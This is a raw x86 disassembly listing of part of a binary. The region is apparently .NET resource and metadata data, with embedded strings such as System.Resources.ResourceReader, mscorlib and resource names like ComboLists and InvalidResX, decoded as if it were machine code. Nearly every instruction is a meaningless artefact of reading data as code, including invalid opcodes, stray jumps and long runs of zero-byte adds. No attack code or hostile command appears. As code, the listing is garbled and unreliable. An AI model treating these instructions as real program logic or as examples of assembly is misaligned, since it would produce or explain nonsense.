  403a74:	or     cl,BYTE PTR [edx]
  403a76:	push   ss
  403a77:	or     ebp,DWORD PTR [ebx]
  403a79:	xor    al,BYTE PTR [ebx]
  403a7b:	pop    es
  403a7c:	add    al,0x58
  403a7e:	xchg   ebx,eax
  403a7f:	pop    ds
  403a80:	or     dh,BYTE PTR [ebx]
  403a82:	pop    ss
  403a83:	add    ah,BYTE PTR ds:0x937b
  403a89:	add    al,0x17
  403a8b:	pop    eax
  403a8c:	jge    0x403a21
  403a8e:	add    BYTE PTR [eax],al
  403a90:	add    al,0x2
  403a92:	push   ss
  403a93:	jge    0x403a29
  403a95:	add    BYTE PTR [eax],al
  403a97:	add    al,0x2b
  403a99:	push   cs
  403a9a:	add    ah,BYTE PTR ds:0x947b
  403aa0:	add    al,0x17
  403aa2:	pop    eax
  403aa3:	jge    0x403a39
  403aa5:	add    BYTE PTR [eax],al
  403aa7:	add    al,0x7
  403aa9:	pop    ss
  403aaa:	pop    eax
  403aab:	or     eax,DWORD PTR [edi]
  403aad:	push   es
  403aae:	xor    cl,dl
  403ab0:	push   es
  403ab1:	sub    al,BYTE PTR [eax]
  403ab3:	add    BYTE PTR [ebx],dl
  403ab5:	xor    BYTE PTR [ebx],al
  403ab7:	add    BYTE PTR [ecx],ah
  403ab9:	add    BYTE PTR [eax],al
  403abb:	add    BYTE PTR [eax+eax*1],al
  403abe:	add    BYTE PTR [ecx],dl
  403ac0:	add    ch,BYTE PTR [eax]
  403ac2:	lahf   
  403ac3:	add    BYTE PTR [eax],al
  403ac5:	or     cl,BYTE PTR [edx]
  403ac7:	push   es
  403ac8:	sub    al,0x15
  403aca:	add    ah,BYTE PTR ds:0x937b
  403ad0:	add    al,0x17
  403ad2:	pop    eax
  403ad3:	jge    0x403a68
  403ad5:	add    BYTE PTR [eax],al
  403ad7:	add    al,0x2
  403ad9:	push   ss
  403ada:	jge    0x403a70
  403adc:	add    BYTE PTR [eax],al
  403ade:	add    al,0x6
  403ae0:	sub    ch,BYTE PTR [esi]
  403ae2:	jb     0x403a89
  403ae4:	pop    es
  403ae5:	add    BYTE PTR [eax+0x73],dh
  403ae8:	mov    al,ds:0x7a0a0000
  403aed:	push   ds
  403aee:	add    bh,BYTE PTR [ebx-0x6d]
  403af1:	add    BYTE PTR [eax],al
  403af3:	add    al,0x2a
  403af5:	push   ds
  403af6:	add    bh,BYTE PTR [ebx-0x6c]
  403af9:	add    BYTE PTR [eax],al
  403afb:	add    al,0x2a
  403afd:	jp     0x403b01
  403aff:	add    ebp,DWORD PTR [eax]
  403b01:	mov    eax,ds:0x20a0000
  403b06:	add    al,0x7d
  403b08:	xchg   ebp,eax
  403b09:	add    BYTE PTR [eax],al
  403b0b:	add    al,0x2
  403b0d:	add    eax,0x967d
  403b12:	add    al,0x2
  403b14:	push   cs
  403b15:	add    al,0x7d
  403b17:	xchg   edi,eax
  403b18:	add    BYTE PTR [eax],al
  403b1a:	add    al,0x2a
  403b1c:	push   ds
  403b1d:	add    bh,BYTE PTR [ebx-0x6b]
  403b20:	add    BYTE PTR [eax],al
  403b22:	add    al,0x2a
  403b24:	push   ds
  403b25:	add    bh,BYTE PTR [ebx-0x6a]
  403b28:	add    BYTE PTR [eax],al
  403b2a:	add    al,0x2a
  403b2c:	push   ds
  403b2d:	add    bh,BYTE PTR [ebx-0x69]
  403b30:	add    BYTE PTR [eax],al
  403b32:	add    al,0x2a
  403b34:	push   esi
  403b35:	add    ch,BYTE PTR [eax]
  403b37:	push   ds
  403b38:	add    BYTE PTR [eax],al
  403b3a:	or     al,BYTE PTR [edx]
  403b3c:	add    edi,DWORD PTR [ebp-0x64]
  403b3f:	add    BYTE PTR [eax],al
  403b41:	add    al,0x2
  403b43:	add    al,0x7d
  403b45:	popf   
  403b46:	add    BYTE PTR [eax],al
  403b48:	add    al,0x2a
  403b4a:	add    BYTE PTR [eax],al
  403b4c:	add    BYTE PTR [eax],al
  403b4e:	add    BYTE PTR [eax],al
  403b50:	xchg   ebx,eax
  403b51:	push   ss
  403b52:	add    BYTE PTR [eax],al
  403b54:	into   
  403b55:	retf   0xbeef
  403b58:	add    DWORD PTR [eax],eax
  403b5a:	add    BYTE PTR [eax],al
  403b5c:	xchg   ecx,eax
  403b5d:	add    BYTE PTR [eax],al
  403b5f:	add    BYTE PTR [ebx+edx*2+0x79],ch
  403b63:	jae    0x403bd9
  403b65:	gs ins DWORD PTR es:[edi],dx
  403b67:	cs push edx
  403b69:	gs jae 0x403bdb
  403b6c:	jne    0x403be0
  403b6e:	arpl   WORD PTR [ebp+0x73],sp
  403b71:	cs push edx
  403b73:	gs jae 0x403be5
  403b76:	jne    0x403bea
  403b78:	arpl   WORD PTR [ebp+0x52],sp
  403b7b:	gs popa 
  403b7d:	fs gs jb 0x403bad
  403b81:	and    BYTE PTR [ebp+0x73],ch
  403b84:	arpl   WORD PTR [edi+0x72],bp
  403b87:	ins    BYTE PTR es:[edi],dx
  403b88:	imul   esp,DWORD PTR [edx+0x2c],0x72655620
  403b8f:	jae    0x403bfa
  403b91:	outs   dx,DWORD PTR ds:[esi]
  403b92:	outs   dx,BYTE PTR ds:[esi]
  403b93:	cmp    eax,0x2e302e32
  403b98:	xor    BYTE PTR [esi],ch
  403b9a:	xor    BYTE PTR [eax+eiz*1],ch
  403b9d:	inc    ebx
  403b9e:	jne    0x403c0c
  403ba0:	je     0x403c17
  403ba2:	jb     0x403c09
  403ba4:	cmp    eax,0x7475656e
  403ba9:	jb     0x403c0c
  403bab:	ins    BYTE PTR es:[edi],dx
  403bac:	sub    al,0x20
  403bae:	push   eax
  403baf:	jne    0x403c13
  403bb1:	ins    BYTE PTR es:[edi],dx
  403bb2:	imul   esp,DWORD PTR [ebx+0x4b],0x6f547965
  403bb9:	imul   esp,DWORD PTR [ebp+0x6e],0x3d
  403bbd:	bound  esi,QWORD PTR [edi]
  403bbf:	aaa    
  403bc0:	popa   
  403bc1:	xor    eax,0x31363563
  403bc6:	cmp    DWORD PTR [ebx],esi
  403bc8:	xor    al,0x65
  403bca:	xor    BYTE PTR [eax],bh
  403bcc:	cmp    DWORD PTR [ebx],esp
  403bce:	push   ebx
  403bcf:	jns    0x403c44
  403bd1:	je     0x403c38
  403bd3:	ins    DWORD PTR es:[edi],dx
  403bd4:	cs push edx
  403bd6:	gs jae 0x403c48
  403bd9:	jne    0x403c4d
  403bdb:	arpl   WORD PTR [ebp+0x73],sp
  403bde:	cs push edx
  403be0:	jne    0x403c50
  403be2:	je     0x403c4d
  403be4:	ins    DWORD PTR es:[edi],dx
  403be5:	gs push edx
  403be7:	gs jae 0x403c59
  403bea:	jne    0x403c5e
  403bec:	arpl   WORD PTR [ebp+0x53],sp
  403bef:	gs je  0x403bf4
  403bf2:	add    BYTE PTR [eax],al
  403bf4:	add    BYTE PTR [ecx],ah
  403bf6:	add    BYTE PTR [eax],al
  403bf8:	add    BYTE PTR [eax],al
  403bfa:	add    BYTE PTR [eax],al
  403bfc:	add    BYTE PTR [eax+0x41],dl
  403bff:	inc    esp
  403c00:	push   eax
  403c01:	inc    ecx
  403c02:	inc    esp
  403c03:	push   eax
  403c04:	jns    0x403c1e
  403c06:	scas   eax,DWORD PTR es:[edi]
  403c07:	xchg   BYTE PTR [ebx],ch
  403c09:	aaa    
  403c0a:	loop   0x403b9a
  403c0c:	xchg   esi,eax
  403c0d:	add    eax,0xaecc9533
  403c12:	cmp    ebx,DWORD PTR [esi-0x5b3ce500]
  403c18:	jecxz  0x403c71
  403c1a:	lea    ebp,[eax-0x5604ec00]
  403c20:	nop
  403c21:	(bad)  
  403c22:	push   edx
  403c23:	les    ecx,FWORD PTR [edx]
  403c25:	ins    BYTE PTR es:[edi],dx
  403c26:	xchg   dh,al
  403c28:	rcl    BYTE PTR [eax-0x1bf03070],cl
  403c2e:	mov    al,0xd5
  403c30:	or     BYTE PTR [edi+0x48],al
  403c33:	fild   DWORD PTR [edi+ecx*2]
  403c36:	dec    ecx
  403c37:	loopne 0x403c5c
  403c39:	loopne 0x403be7
  403c3b:	in     al,0xb4
  403c3d:	sbb    BYTE PTR [edi+0x7d605bec],dh
  403c43:	icebp  
  403c44:	xchg   ecx,eax
  403c45:	test   esi,edx
  403c47:	or     BYTE PTR [esi],bl
  403c49:	inc    esp
  403c4a:	out    0x9,al
  403c4c:	and    al,cl
  403c4e:	push   cs
  403c4f:	or     eax,0xdddf6fa
  403c54:	repnz pop ebp
  403c56:	scas   al,BYTE PTR es:[edi]
  403c57:	push   ss
  403c58:	lds    esp,FWORD PTR [ecx]
  403c5a:	mov    WORD PTR [ebx],ds
  403c5c:	dec    eax
  403c5d:	xchg   edi,eax
  403c5e:	sub    BYTE PTR [eax],ch
  403c60:	inc    esi
  403c61:	and    ch,BYTE PTR [eax+0x2e]
  403c64:	jge    0x403cd0
  403c66:	or     DWORD PTR [ebx],esi
  403c68:	push   edx
  403c69:	(bad)  
  403c6a:	push   esp
  403c6b:	cmp    DWORD PTR [edx],edi
  403c6d:	and    eax,0xafba4775
  403c72:	arpl   WORD PTR [ecx-0x6e],cx
  403c75:	pushf  
  403c76:	dec    esi
  403c77:	dec    edx
  403c78:	inc    edi
  403c79:	jnp    0x403c06
  403c7b:	push   edi
  403c7c:	out    0xbb,eax
  403c7e:	neg    BYTE PTR [ecx+0x18]
  403c81:	xor    esi,DWORD PTR [ebx]
  403c83:	fs popf 
  403c85:	or     eax,0x6971ee
  403c8a:	add    BYTE PTR [eax],al
  403c8c:	add    eax,0xbf000003
  403c91:	add    al,BYTE PTR [eax]
  403c93:	add    BYTE PTR [ecx],bh
  403c95:	add    al,0x0
  403c97:	add    BYTE PTR [esi+0x4],dl
  403c9a:	add    BYTE PTR [eax],al
  403c9c:	xor    BYTE PTR [ebx],al
  403c9e:	add    BYTE PTR [eax],al
  403ca0:	or     al,BYTE PTR [edx]
  403ca2:	add    BYTE PTR [eax],al
  403ca4:	pop    edx
  403ca5:	add    eax,DWORD PTR [eax]
  403ca7:	add    BYTE PTR [esi+0x2],cl
  403caa:	add    BYTE PTR [eax],al
  403cac:	loopne 0x403cb1
  403cae:	add    BYTE PTR [eax],al
  403cb0:	les    eax,FWORD PTR [ecx]
  403cb2:	add    BYTE PTR [eax],al
  403cb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403cb5:	add    al,BYTE PTR [eax]
  403cb7:	add    BYTE PTR [ecx+0x3],al
  403cba:	add    BYTE PTR [eax],al
  403cbc:	sub    eax,0x6f000000
  403cc1:	add    al,BYTE PTR [eax]
  403cc3:	add    al,dh
  403cc5:	add    al,BYTE PTR [eax]
  403cc7:	add    BYTE PTR [edi],ah
  403cc9:	add    al,BYTE PTR [eax]
  403ccb:	add    cl,dh
  403ccd:	add    DWORD PTR [eax],eax
  403ccf:	add    BYTE PTR [ecx],cl
  403cd1:	add    al,0x0
  403cd3:	add    BYTE PTR [ecx-0x4cffffff],dh
  403cd9:	add    eax,DWORD PTR [eax]
  403cdb:	add    dh,dl
  403cdd:	add    BYTE PTR [eax],al
  403cdf:	add    BYTE PTR [eax],al
  403ce1:	add    BYTE PTR [eax],al
  403ce3:	add    BYTE PTR [eax+0x6b000001],al
  403ce9:	add    eax,DWORD PTR [eax]
  403ceb:	add    bl,bh
  403ced:	add    BYTE PTR [eax],al
  403cef:	add    BYTE PTR [eax-0x47000000],cl
  403cf5:	add    BYTE PTR [eax],al
  403cf7:	add    BYTE PTR [eax],bl
  403cf9:	add    al,0x0
  403cfb:	add    BYTE PTR [ecx+eax*1],dh
  403cfe:	add    BYTE PTR [eax],al
  403d00:	popa   
  403d01:	add    DWORD PTR [eax],eax
  403d03:	add    BYTE PTR [edx+0x44000003],cl
  403d09:	add    BYTE PTR [eax],al
  403d0b:	add    BYTE PTR [ebx],ch
  403d0d:	push   es
  403d0e:	add    BYTE PTR [eax],al
  403d10:	sub    BYTE PTR [edx+0x0],al
  403d13:	popa   
  403d14:	add    BYTE PTR [eax+eax*1+0x43],ah
  403d18:	add    BYTE PTR [edi+0x0],ch
  403d1b:	ins    DWORD PTR es:[edi],dx
  403d1c:	add    BYTE PTR [ebp+0x0],ch
  403d1f:	popa   
  403d20:	add    BYTE PTR [esi+0x0],ch
  403d23:	add    BYTE PTR fs:[eax+eax*1+0x69],cl
  403d28:	add    BYTE PTR [esi+0x0],ch
  403d2b:	add    BYTE PTR gs:[edi+0x0],cl
  403d2f:	jo     0x403d31
  403d31:	je     0x403d33
  403d33:	imul   eax,DWORD PTR [eax],0x6e006f
  403d39:	add    BYTE PTR [eax],al
  403d3b:	add    BYTE PTR [eax],al
  403d3d:	adc    al,BYTE PTR [edx+0x0]
  403d40:	popa   
  403d41:	add    BYTE PTR [eax+eax*1+0x45],ah
  403d45:	add    BYTE PTR [ebx+0x0],dh
  403d48:	arpl   WORD PTR [eax],ax
  403d4a:	popa   
  403d4b:	add    BYTE PTR [eax+0x0],dh
  403d4e:	add    BYTE PTR gs:[ebx+0x0],al
  403d52:	add    BYTE PTR [eax],al
  403d54:	and    BYTE PTR [edx+0x0],al
  403d57:	popa   
  403d58:	add    BYTE PTR [eax+eax*1+0x46],ah
  403d5c:	add    BYTE PTR [ecx+0x0],ch
  403d5f:	ins    BYTE PTR es:[edi],dx
  403d60:	add    BYTE PTR [ebp+0x0],ah
  403d63:	inc    ebp
  403d64:	add    BYTE PTR [eax+0x0],bh
  403d67:	je     0x403d69
  403d69:	add    BYTE PTR gs:[esi+0x0],ch
  403d6d:	jae    0x403d6f
  403d6f:	imul   eax,DWORD PTR [eax],0x6e006f
  403d75:	call   0x42:0x1a000000
  403d7c:	add    BYTE PTR gs:[edi+0x0],ah
  403d80:	imul   eax,DWORD PTR [eax],0x53006e
  403d86:	push   esp
  403d87:	add    BYTE PTR [edx+0x0],dl
  403d8a:	inc    ebx
  403d8b:	add    BYTE PTR [eax+eax*1+0x61],ch
  403d8f:	add    BYTE PTR [ebx+0x0],dh
  403d92:	jae    0x403d94
  403d94:	adc    DWORD PTR [ecx],eax
  403d96:	add    BYTE PTR [eax],al
  403d98:	sub    al,0x42
  403d9a:	add    BYTE PTR [ebp+0x0],ah
  403d9d:	add    BYTE PTR [bx+di+0x0],ch
  403da1:	outs   dx,BYTE PTR ds:[esi]
  403da2:	add    BYTE PTR [ebx+0x0],dl
  403da5:	push   esp
  403da6:	add    BYTE PTR [edx+0x0],dl
  403da9:	inc    ebx
  403daa:	add    BYTE PTR [eax+eax*1+0x61],ch
  403dae:	add    BYTE PTR [ebx+0x0],dh
  403db1:	jae    0x403db3
  403db3:	dec    esi
  403db4:	add    BYTE PTR [ecx+0x0],ah
  403db7:	ins    DWORD PTR es:[edi],dx
  403db8:	add    BYTE PTR [ebp+0x0],ah
  403dbb:	jae    0x403dbd
  403dbd:	jo     0x403dbf
  403dbf:	popa   
  403dc0:	add    BYTE PTR [ebx+0x0],ah
  403dc3:	add    BYTE PTR gs:[ecx+eax*1+0x0],al
  403dc8:	add    BYTE PTR [eax],bl
  403dca:	inc    edx
  403dcb:	add    BYTE PTR [ebp+0x0],ah
  403dce:	add    BYTE PTR [bx+di+0x0],ch
  403dd2:	outs   dx,BYTE PTR ds:[esi]
  403dd3:	add    BYTE PTR [edi+0x0],dl
  403dd6:	jb     0x403dd8
  403dd8:	imul   eax,DWORD PTR [eax],0x690074
  403dde:	outs   dx,BYTE PTR ds:[esi]
  403ddf:	add    BYTE PTR [edi+0x0],ah
  403de2:	jnp    0x403de5
  403de4:	add    BYTE PTR [eax],al
  403de6:	and    BYTE PTR [ebx+0x0],al
  403de9:	popa   
  403dea:	add    BYTE PTR [esi+0x0],ch
  403ded:	je     0x403def
  403def:	dec    esp
  403df0:	add    BYTE PTR [edi+0x0],ch
  403df3:	popa   
  403df4:	add    BYTE PTR [eax+eax*1+0x41],ah
  403df8:	add    BYTE PTR [ebx+0x0],dh
  403dfb:	jae    0x403dfd
  403dfd:	add    BYTE PTR gs:[ebp+0x0],ch
  403e01:	bound  eax,QWORD PTR [eax]
  403e03:	ins    BYTE PTR es:[edi],dx
  403e04:	add    BYTE PTR [ecx+0x0],bh
  403e07:	xchg   edi,eax
  403e08:	add    DWORD PTR [eax],eax
  403e0a:	add    BYTE PTR [ebx+eax*2],dh
  403e0d:	add    BYTE PTR [eax+eax*1+0x61],ch
  403e11:	add    BYTE PTR [ebx+0x0],dh
  403e14:	jae    0x403e16
  403e16:	outs   dx,BYTE PTR ds:[esi]
  403e17:	add    BYTE PTR [ecx+0x0],ah
  403e1a:	ins    DWORD PTR es:[edi],dx
  403e1b:	add    BYTE PTR [ebp+0x0],ah
  403e1e:	dec    ebp
  403e1f:	add    BYTE PTR [ebp+0x0],dh
  403e22:	jae    0x403e24
  403e24:	je     0x403e26
  403e26:	dec    ebp
  403e27:	add    BYTE PTR [ecx+0x0],ah
  403e2a:	je     0x403e2c
  403e2c:	arpl   WORD PTR [eax],ax
  403e2e:	push   0x61004200
  403e33:	add    BYTE PTR [ebx+0x0],dh
  403e36:	add    BYTE PTR gs:[esi+0x0],ch
  403e3a:	popa   
  403e3b:	add    BYTE PTR [ebp+0x0],ch
  403e3e:	gs add dh,bl
  403e41:	add    DWORD PTR [eax],eax
  403e43:	add    BYTE PTR [eax],ch
  403e45:	inc    ebx
  403e46:	add    BYTE PTR [edi+0x0],ch
  403e49:	ins    DWORD PTR es:[edi],dx
  403e4a:	add    BYTE PTR [eax+0x0],dh
  403e4d:	imul   eax,DWORD PTR [eax],0x65006c
  403e53:	inc    ecx
  403e54:	add    BYTE PTR [esi+0x0],ch
  403e57:	add    BYTE PTR fs:[ebx+0x0],dl
  403e5b:	push   esp
  403e5c:	add    BYTE PTR [edx+0x0],dl
  403e5f:	inc    esp
  403e60:	add    BYTE PTR [edi+0x0],ch
  403e63:	outs   dx,BYTE PTR ds:[esi]
  403e64:	add    BYTE PTR [eax+eax*1+0x4d],dh
  403e68:	add    BYTE PTR [ecx+0x0],ch
  403e6b:	js     0x403e6d
  403e6d:	iret   
  403e6e:	add    al,BYTE PTR [eax]
  403e70:	add    BYTE PTR [edx],bl
  403e72:	inc    ebx
  403e73:	add    BYTE PTR [edi+0x0],ch
  403e76:	jb     0x403e78
  403e78:	jb     0x403e7a
  403e7a:	jne    0x403e7c
  403e7c:	jo     0x403e7e
  403e7e:	je     0x403e80
  403e80:	dec    edi
  403e81:	add    BYTE PTR [ebp+0x0],dh
  403e84:	je     0x403e86
  403e86:	jo     0x403e88
  403e88:	jne    0x403e8a
  403e8a:	je     0x403e8c
  403e8c:	mov    ecx,0x2c000003
  403e91:	inc    esp
  403e92:	add    BYTE PTR [ebp+0x0],ah
  403e95:	ins    BYTE PTR es:[edi],dx
  403e96:	add    BYTE PTR [ebp+0x0],ah
  403e99:	je     0x403e9b
  403e9b:	add    BYTE PTR gs:[edi+0x0],cl
  403e9f:	jne    0x403ea1
  403ea1:	je     0x403ea3
  403ea3:	jo     0x403ea5
  403ea5:	jne    0x403ea7
  403ea7:	je     0x403ea9
  403ea9:	inc    esi
  403eaa:	add    BYTE PTR [ecx+0x0],ch
  403ead:	ins    BYTE PTR es:[edi],dx
  403eae:	add    BYTE PTR [ebp+0x0],ah
  403eb1:	inc    esi
  403eb2:	add    BYTE PTR [ecx+0x0],ah
  403eb5:	imul   eax,DWORD PTR [eax],0x65006c
  403ebb:	fs add bh,ch
  403ebe:	add    eax,DWORD PTR [eax]
  403ec0:	add    BYTE PTR [esi],cl
  403ec2:	inc    esp
  403ec3:	add    BYTE PTR [edi+0x0],ch
  403ec6:	outs   dx,BYTE PTR ds:[esi]
  403ec7:	add    BYTE PTR [ebp+0x0],ah
  403eca:	inc    esp
  403ecb:	add    BYTE PTR [edi+0x0],ch
  403ece:	je     0x403ed0
  403ed0:	daa    
  403ed1:	add    al,0x0
  403ed3:	add    BYTE PTR [eax],ch
  403ed5:	inc    esp
  403ed6:	add    BYTE PTR [ebp+0x0],dh
  403ed9:	jo     0x403edb
  403edb:	ins    BYTE PTR es:[edi],dx
  403edc:	add    BYTE PTR [ecx+0x0],ch
  403edf:	arpl   WORD PTR [eax],ax
  403ee1:	popa   
  403ee2:	add    BYTE PTR [eax+eax*1+0x65],dh
  403ee6:	add    BYTE PTR [edx+0x0],dl
  403ee9:	add    BYTE PTR gs:[ebx+0x0],dh
  403eed:	outs   dx,DWORD PTR ds:[esi]
  403eee:	add    BYTE PTR [ebp+0x0],dh
  403ef1:	jb     0x403ef3
  403ef3:	arpl   WORD PTR [eax],ax
  403ef5:	add    BYTE PTR gs:[ebx+0x0],cl
  403ef9:	add    BYTE PTR gs:[ecx+0x0],bh
  403efd:	cs add al,0x0
  403f00:	add    BYTE PTR [eax*2+0x72007200],dl
  403f07:	add    BYTE PTR [edi+0x0],ch
  403f0a:	jb     0x403f0c
  403f0c:	inc    ebx
  403f0d:	add    BYTE PTR [edi+0x0],ch
  403f10:	jne    0x403f12
  403f12:	outs   dx,BYTE PTR ds:[esi]
  403f13:	add    BYTE PTR [eax+eax*1+0x58],dh
  403f17:	add    al,0x0
  403f19:	add    BYTE PTR [eax],bl
  403f1b:	inc    esi
  403f1c:	add    BYTE PTR [ecx+0x0],ch
  403f1f:	ins    BYTE PTR es:[edi],dx
  403f20:	add    BYTE PTR [ebp+0x0],ah
  403f23:	dec    esi
  403f24:	add    BYTE PTR [edi+0x0],ch
  403f27:	je     0x403f29
  403f29:	inc    esi
  403f2a:	add    BYTE PTR [edi+0x0],ch
  403f2d:	jne    0x403f2f
  403f2f:	outs   dx,BYTE PTR ds:[esi]
  403f30:	add    BYTE PTR [eax+eax*1+0x67],ah
  403f34:	add    al,0x0
  403f36:	add    BYTE PTR [edx],ah
  403f38:	inc    edi
  403f39:	add    BYTE PTR [ebp+0x0],ah
  403f3c:	outs   dx,BYTE PTR ds:[esi]
  403f3d:	add    BYTE PTR [ebp+0x0],ah
  403f40:	jb     0x403f42
  403f42:	imul   eax,DWORD PTR [eax],0x570063
  403f48:	jb     0x403f4a
  403f4a:	imul   eax,DWORD PTR [eax],0x650074
  403f50:	inc    ebp
  403f51:	add    BYTE PTR [edx+0x0],dh
  403f54:	jb     0x403f56
  403f56:	outs   dx,DWORD PTR ds:[esi]
  403f57:	add    BYTE PTR [edx+0x0],dh
  403f5a:	xchg   DWORD PTR [eax+eax*1],eax
  403f5d:	add    BYTE PTR [ecx+ecx*2],bl
  403f60:	add    BYTE PTR [esi+0x0],cl
  403f63:	inc    esi
  403f64:	add    BYTE PTR [esi+0x0],al
  403f67:	imul   eax,DWORD PTR [eax],0x65006c
  403f6d:	inc    edx
  403f6e:	add    BYTE PTR [edx+0x0],dh
  403f71:	popa   
  403f72:	add    BYTE PTR [ebx+0x0],ah
  403f75:	imul   eax,DWORD PTR [eax],0x65
  403f78:	add    BYTE PTR [eax+eax*1-0x4e],dh
  403f7c:	add    al,0x0
  403f7e:	add    BYTE PTR [eax],dh
  403f80:	dec    ecx
  403f81:	add    BYTE PTR [esi+0x0],ch
  403f84:	jbe    0x403f86
  403f86:	popa   
  403f87:	add    BYTE PTR [eax+eax*1+0x69],ch
  403f8b:	add    BYTE PTR [eax+eax*1+0x43],ah
  403f8f:	add    BYTE PTR [edi+0x0],ch
  403f92:	ins    DWORD PTR es:[edi],dx
  403f93:	add    BYTE PTR [ebp+0x0],ch
  403f96:	popa   
  403f97:	add    BYTE PTR [esi+0x0],ch
  403f9a:	add    BYTE PTR fs:[eax+eax*1+0x69],cl
  403f9f:	add    BYTE PTR [esi+0x0],ch
  403fa2:	add    BYTE PTR gs:[ebx+0x0],dl
  403fa6:	jns    0x403fa8
  403fa8:	outs   dx,BYTE PTR ds:[esi]
  403fa9:	add    BYTE PTR [eax+eax*1+0x61],dh
  403fad:	add    BYTE PTR [eax+0x0],bh
  403fb0:	sbb    al,0x5
  403fb2:	add    BYTE PTR [eax],al
  403fb4:	push   ss
  403fb5:	dec    ecx
  403fb6:	add    BYTE PTR [esi+0x0],ch
  403fb9:	jbe    0x403fbb
  403fbb:	popa   
  403fbc:	add    BYTE PTR [eax+eax*1+0x69],ch
  403fc0:	add    BYTE PTR [eax+eax*1+0x52],ah
  403fc4:	add    BYTE PTR [ebp+0x0],ah
  403fc7:	jae    0x403fc9
  403fc9:	pop    eax
  403fca:	add    BYTE PTR [edx+0x2c000005],al
  403fd0:	dec    ebp
  403fd1:	add    BYTE PTR [ecx+0x0],ah
  403fd4:	ins    BYTE PTR es:[edi],dx
  403fd5:	add    BYTE PTR [esi+0x0],ah
  403fd8:	outs   dx,DWORD PTR ds:[esi]
  403fd9:	add    BYTE PTR [edx+0x0],dh
  403fdc:	ins    DWORD PTR es:[edi],dx
  403fdd:	add    BYTE PTR [ebp+0x0],ah
  403fe0:	add    BYTE PTR fs:[ebx+0x0],al
  403fe4:	outs   dx,DWORD PTR ds:[esi]
  403fe5:	add    BYTE PTR [ebp+0x0],ch
  403fe8:	jo     0x403fea
  403fea:	imul   eax,DWORD PTR [eax],0x65006c
  403ff0:	push   ebx
  403ff1:	add    BYTE PTR [eax+eax*1+0x72],dh
  403ff5:	add    BYTE PTR [ecx+0x0],ch
  403ff8:	outs   dx,BYTE PTR ds:[esi]
  403ff9:	add    BYTE PTR [edi+0x0],ah
  403ffc:	retf   0x5
  403fff:	add    BYTE PTR [eax],dl
  404001:	dec    esi
  404002:	add    BYTE PTR [edi+0x0],ch
  404005:	inc    ebp
  404006:	add    BYTE PTR [ecx+0x0],dh
  404009:	jne    0x40400b
  40400b:	popa   
  40400c:	add    BYTE PTR [eax+eax*1+0x73],ch
  404010:	add    BYTE PTR [ecx],bh
  404012:	push   es
  404013:	add    BYTE PTR [eax],al
  404015:	es dec esi
  404017:	add    BYTE PTR [edi+0x0],ch
  40401a:	inc    ebp
  40401b:	add    BYTE PTR [ecx+0x0],dh
  40401e:	jne    0x404020
  404020:	popa   
  404021:	add    BYTE PTR [eax+eax*1+0x73],ch
  404025:	add    BYTE PTR [edi+0x0],dl
  404028:	imul   eax,DWORD PTR [eax],0x680074
  40402e:	dec    esi
  40402f:	add    BYTE PTR [ebp+0x0],ah
  404032:	ja     0x404034
  404034:	dec    esp
  404035:	add    BYTE PTR [ecx+0x0],ch
  404038:	outs   dx,BYTE PTR ds:[esi]
  404039:	add    BYTE PTR [ebp+0x0],ah
  40403c:	cdq    
  40403d:	push   es
  40403e:	add    BYTE PTR [eax],al
  404040:	or     al,0x4e
  404042:	add    BYTE PTR [edi+0x0],ch
  404045:	dec    esi
  404046:	add    BYTE PTR [ecx+0x0],ah
  404049:	ins    DWORD PTR es:[edi],dx
  40404a:	add    BYTE PTR [ebp+0x0],ah
  40404d:	or     al,BYTE PTR [edi]
  40404f:	add    BYTE PTR [eax],al
  404051:	adc    al,0x4f
  404053:	add    BYTE PTR [esi+0x0],ch
  404056:	ins    BYTE PTR es:[edi],dx
  404057:	add    BYTE PTR [ecx+0x0],bh
  40405a:	push   ebx
  40405b:	add    BYTE PTR [eax+eax*1+0x72],dh
  40405f:	add    BYTE PTR [ecx+0x0],ch
  404062:	outs   dx,BYTE PTR ds:[esi]
  404063:	add    BYTE PTR [edi+0x0],ah
  404066:	pop    ebp
  404067:	pop    es
  404068:	add    BYTE PTR [eax],al
  40406a:	or     al,0x52
  40406c:	add    BYTE PTR [ebp+0x0],ah
  40406f:	popa   
  404070:	add    BYTE PTR [eax+eax*1+0x49],ah
  404074:	add    BYTE PTR [esi+0x0],ch
  404077:	test   al,0x7
  404079:	add    BYTE PTR [eax],al
  40407b:	sbb    dl,BYTE PTR [ebx+0x0]
  40407e:	jo     0x404080
  404080:	add    BYTE PTR gs:[ebx+0x0],ah
  404084:	imul   eax,DWORD PTR [eax],0x690066
  40408a:	arpl   WORD PTR [eax],ax
  40408c:	inc    ebp
  40408d:	add    BYTE PTR [edx+0x0],dh
  404090:	jb     0x404092
  404092:	outs   dx,DWORD PTR ds:[esi]
  404093:	add    BYTE PTR [edx+0x0],dh
  404096:	retf   0x7
  404099:	add    BYTE PTR [ebx+edx*2],ah
  40409c:	add    BYTE PTR [eax+eax*1+0x72],dh
  4040a0:	add    BYTE PTR [ecx+0x0],ch
  4040a3:	outs   dx,BYTE PTR ds:[esi]
  4040a4:	add    BYTE PTR [edi+0x0],ah
  4040a7:	jae    0x4040a9
  4040a9:	push   esp
  4040aa:	add    BYTE PTR [ecx+0x0],ah
  4040ad:	add    BYTE PTR [bx+0x0],cl
  4040b1:	bound  eax,QWORD PTR [eax]
  4040b3:	jae    0x4040b5
  4040b5:	outs   dx,DWORD PTR ds:[esi]
  4040b6:	add    BYTE PTR [eax+eax*1+0x65],ch
  4040ba:	add    BYTE PTR [eax+eax*1+0x65],dh
  4040be:	add    ch,dh
  4040c0:	pop    es
  4040c1:	add    BYTE PTR [eax],al
  4040c3:	sub    BYTE PTR [ebp+0x0],dl
  4040c6:	outs   dx,BYTE PTR ds:[esi]
  4040c7:	add    BYTE PTR [ebx+0x0],ch
  4040ca:	outs   dx,BYTE PTR ds:[esi]
  4040cb:	add    BYTE PTR [edi+0x0],ch
  4040ce:	ja     0x4040d0
  4040d0:	outs   dx,BYTE PTR ds:[esi]
  4040d1:	add    BYTE PTR [esi+0x0],al
  4040d4:	imul   eax,DWORD PTR [eax],0x65006c
  4040da:	inc    ebp
  4040db:	add    BYTE PTR [eax+0x0],bh
  4040de:	je     0x4040e0
  4040e0:	add    BYTE PTR gs:[esi+0x0],ch
  4040e4:	jae    0x4040e6
  4040e6:	imul   eax,DWORD PTR [eax],0x6e006f
  4040ec:	dec    eax
  4040ed:	or     BYTE PTR [eax],al
  4040ef:	add    BYTE PTR [edx*2+0x6d006e00],ah
  4040f6:	add    BYTE PTR [ecx+0x0],ah
  4040f9:	jo     0x4040fb
